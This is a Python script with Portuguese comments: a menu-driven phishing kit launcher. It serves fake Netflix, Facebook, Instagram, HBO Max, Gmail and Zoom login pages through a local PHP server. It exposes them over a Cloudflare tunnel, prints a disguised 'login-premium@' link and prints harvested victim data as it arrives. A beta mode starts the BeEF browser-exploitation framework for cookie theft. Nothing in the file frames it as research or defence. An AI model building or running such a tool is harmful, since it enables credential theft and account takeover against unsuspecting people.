#!/usr/bin/env python3

import os
import subprocess
import sys
import time
import threading
import shutil
import re

# Cores
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
RED = '\033[0;31m'
NC = '\033[0m'

# Configurações
APACHE_DIR = "/var/www/html/page-fake"
MODELS_DIR = "API/img"
EGS_DIR = "API/models"
DATA_FILE = f"{APACHE_DIR}/dados.txt"

def setup():
    os.makedirs(APACHE_DIR, exist_ok=True)
    print(f"{GREEN}[+] Pasta fake criada em {APACHE_DIR}{NC}")

def get_cloudflared_link():
    try:
        # Método confiável para obter o link real
        process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"],
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 text=True)
        
        # Padrão regex para identificar o link correto
        url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
        
        for _ in range(20):  # Timeout de 20 segundos
            line = process.stderr.readline()
            if line:
                match = url_pattern.search(line)
                if match:
                    real_url = match.group(0)
                    return real_url, process
            time.sleep(1)
        
        return None, process
        
    except Exception as e:
        print(f"{RED}[!] Erro ao obter link: {e}{NC}")
        return None, None

def start_attack(egs_type, model):
    # Configura arquivos
    subprocess.run(["cp", f"{MODELS_DIR}/{model}.jpg", f"{APACHE_DIR}/1.jpg"], check=True)
    
    if egs_type == "1":
        subprocess.run(["cp", f"{EGS_DIR}/index.php", APACHE_DIR], check=True)
    else:  # Modo Beta
        subprocess.run(["cp", f"{EGS_DIR}/2.php", APACHE_DIR], check=True)
        subprocess.run(["systemctl", "start", "beef-xss"], check=True)
    
    subprocess.run(["chmod", "-R", "755", APACHE_DIR], check=True)
    subprocess.run(["systemctl", "start", "apache2"], check=True)

    # Inicia servidor PHP
    php_proc = subprocess.Popen(["php", "-S", "localhost:8080"],
                              cwd=APACHE_DIR,
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)

    # Obtém link do Cloudflared
    cf_link, cf_proc = get_cloudflared_link()
    if not cf_link:
        php_proc.terminate()
        print(f"{RED}[!] Falha ao obter link do Cloudflared{NC}")
        return None, None

    print(f"\n{YELLOW}>>> LINK GERADO: {cf_link}{NC}")
    print(f"{YELLOW}>>> MASCARADO: https://login-premium@{cf_link.split('://')[1]}{NC}\n")

    # Monitora dados
    threading.Thread(target=monitor_data, args=(DATA_FILE,), daemon=True).start()
    
    return php_proc, cf_proc

def monitor_data(file):
    try:
        while True:
            if os.path.exists(file):
                with open(file, "r") as f:
                    data = f.read().strip()
                    if data:
                        print(f"{GREEN}[+] Dados capturados: {data}{NC}")
            time.sleep(2)
    except KeyboardInterrupt:
        pass

def show_menu(title, options):
    os.system("clear")
    print(f"{YELLOW}+{'-'*60}+{NC}")
    print(f"{YELLOW}|{title:^60}|{NC}")
    print(f"{YELLOW}+{'-'*60}+{NC}")
    for num, opt in options.items():
        print(f"{YELLOW}| {num}. {opt:<56}|{NC}")
    print(f"{YELLOW}+{'-'*60}+{NC}")

def main():
    # Verifica dependências
    if not shutil.which("cloudflared"):
        print(f"{RED}[!] Cloudflared não encontrado! Instale primeiro.{NC}")
        sys.exit(1)
    
    if not shutil.which("php"):
        print(f"{RED}[!] PHP não encontrado! Instale primeiro.{NC}")
        sys.exit(1)

    setup()

    while True:
        # Menu principal
        show_menu("MENU PRINCIPAL", {
            "1": "Modo Standard",
            "2": "Captura de Cookies (Beta)",
            "0": "Sair"
        })
        choice = input(f"{YELLOW}[+] Escolha: {NC}").strip()
        
        if choice == "0":
            sys.exit(0)
        elif choice not in ["1", "2"]:
            continue
            
        # Menu de modelos
        show_menu("MODELOS DISPONÍVEIS", {
            "1": "Netflix",
            "2": "Facebook",
            "3": "Instagram",
            "4": "HBO Max",
            "5": "Gmail",
            "6": "Zoom",
            "0": "Voltar"
        })
        model = input(f"{YELLOW}[+] Modelo: {NC}").strip()
        
        if model == "0":
            continue
        elif model not in ["1", "2", "3", "4", "5", "6"]:
            print(f"{RED}[!] Modelo inválido{NC}")
            continue
            
        # Inicia ataque
        php_proc, cf_proc = start_attack(choice, model)
        if not php_proc:
            continue
            
        try:
            input(f"{YELLOW}\nPressione ENTER para parar...{NC}")
        except KeyboardInterrupt:
            pass
            
        php_proc.terminate()
        if cf_proc:
            cf_proc.terminate()

if __name__ == "__main__":
    main()
                        
